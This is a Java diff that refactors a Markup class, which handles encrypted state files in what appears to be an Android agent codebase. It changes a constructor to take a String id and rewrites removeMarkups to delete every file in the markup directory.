@@ -19,12 +19,11 @@ import java.io.ObjectOutputStream;
 import java.io.Serializable;
 import java.util.HashMap;
 
-import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
-import com.android.service.event.EventType;
+
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -46,8 +45,8 @@ public class Markup {
 	private String lognName;
 	private AutoFile file;
 	private final Encryption encryption;
-	
-	int num=0;
+
+	int num = 0;
 
 	private Markup() {
 		encryption = new Encryption(Keys.self().getAesKey());
@@ -70,11 +69,11 @@ public class Markup {
 		this();
 		agentId = id.toString();
 	}
-	
-	public Markup(final Integer id, int num) {
+
+	public Markup(final String string, int num) {
 		this();
-		agentId = id.toString();
-		this.num=num;
+		agentId = string;
+		this.num = num;
 	}
 
 	/**
@@ -172,21 +171,15 @@ public class Markup {
 	public static synchronized int removeMarkups() {
 
 		int numDeleted = 0;
-		for (final int type : AgentType.values()) {
-			for (int i = 0; i < MAX_MARKUPS; i++) {
-				if (removeMarkup(type, i)) {
-					numDeleted++;
-				}
-			}
-		}
 
-		for (final int type : EventType.values()) {
-			for (int i = 0; i < MAX_MARKUPS; i++) {
-				if (removeMarkup(type, i)) {
-					numDeleted++;
-				}
-			}			
+		AutoFile dir = new AutoFile(Path.markup());
+		String[] list = dir.list();
+		for (String filename : list) {
+			AutoFile file = new AutoFile(Path.markup(), filename);
+			file.delete();
+			numDeleted++;
 		}
+		dir.delete();
 
 		return numDeleted;
 	}
